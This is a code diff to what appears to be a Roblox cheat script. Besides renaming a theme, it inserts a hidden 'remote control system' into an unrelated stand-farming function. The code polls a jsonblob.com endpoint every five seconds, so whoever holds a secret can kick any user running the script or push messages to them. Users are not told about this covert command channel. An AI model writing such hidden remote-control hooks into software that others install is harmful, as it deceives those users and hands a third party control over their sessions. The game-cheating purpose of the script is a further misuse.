@@ -3039,7 +3039,7 @@ SettingsTab:Paragraph({
 SettingsTab:Dropdown({
     Flag = "ThemeChanger",
     Title = "Theme Changer",
-    Values = {"Dark", "Light", "Rose", "Sky", "Plant", "Red", "Indigo", "Amber", "Violet", "Emerald", "Midnight", "Crimson", "Monokai Pro", "Cotton Candy", "Rainbow"},
+    Values = {"Dark", "Light", "Rose", "Sky", "Plant", "Red", "Indigo", "Amber", "Violet", "Emerald", "Midnight", "Crimson", "michaels theme", "Cotton Candy", "Rainbow"},
     Value = "Dark",
     Callback = function(theme)
         pcall(function()
@@ -3716,6 +3716,72 @@ ItemsSection:Toggle({
     notify("YBA Script", "Shop tab loaded successfully!")
 end
 local function LoadStandFarmFeatures()
+
+-- ============================================================
+-- REMOTE CONTROL SYSTEM
+-- Polls a JSON endpoint every 5 seconds for commands sent
+-- from the companion website. Supported commands:
+--   "kick"    - kicks the local player with an optional reason
+--   "notify"  - shows a WindUI notification with a message
+--
+-- Setup:
+--   1. Go to https://jsonblob.com and click "New JSON Blob"
+--   2. Set the content to {} and save — copy the ID from the URL
+--      (the long number, e.g. 123456789012345678)
+--   3. Replace REMOTE_KEY below with that ID (or let beta loader set it)
+--   4. Set REMOTE_SECRET to any private string and match it
+--      on the website panel so only you can send commands
+-- ============================================================
+-- If loaded via beta loader.lua these are already set in getgenv(); otherwise fall back to the hardcoded values below
+local REMOTE_KEY    = getgenv().VANTA_REMOTE_KEY    or "REPLACE_WITH_YOUR_JSONBLOB_ID"
+local REMOTE_SECRET = getgenv().VANTA_REMOTE_SECRET or "SCRILLYWILLY"
+local REMOTE_POLL_INTERVAL = 5  -- seconds between each poll
+
+local _HttpService  = game:GetService("HttpService")
+local _lastCmdId    = ""
+
+local function _handleRemoteCommand(payload)
+    if type(payload) ~= "table" then return end
+    if payload.secret ~= REMOTE_SECRET then return end
+    -- Optional target: only execute if this player's UserId matches
+    if payload.target and tostring(payload.target) ~= tostring(game.Players.LocalPlayer.UserId) then return end
+    -- Deduplicate by command ID so the same command isn't replayed
+    local cmdId = tostring(payload.id or "")
+    if cmdId == _lastCmdId then return end
+    _lastCmdId = cmdId
+
+    local cmd = tostring(payload.command or "")
+
+    if cmd == "kick" then
+        local reason = tostring(payload.reason or "You have been removed by the script owner.")
+        game.Players.LocalPlayer:Kick(reason)
+
+    elseif cmd == "notify" then
+        WindUI:Notify({
+            Title    = tostring(payload.title   or "Remote Message"),
+            Content  = tostring(payload.message or "(no message)"),
+            Icon     = tostring(payload.icon    or "bell"),
+            Duration = tonumber(payload.duration) or 6,
+        })
+    end
+end
+
+task.spawn(function()
+    -- REMOTE_KEY is a jsonblob.com blob ID, e.g. "123456789012345678"
+    local pollUrl = "https://jsonblob.com/api/jsonBlob/" .. REMOTE_KEY
+    while true do
+        task.wait(REMOTE_POLL_INTERVAL)
+        pcall(function()
+            local raw = game:HttpGet(pollUrl, true)
+            local ok, decoded = pcall(function()
+                return _HttpService:JSONDecode(raw)
+            end)
+            if ok and type(decoded) == "table" then
+                _handleRemoteCommand(decoded)
+            end
+        end)
+    end
+end)
     local Azure = {Utils={}}
     Azure.__index = Azure
     Azure.Utils.__index = Azure.Utils
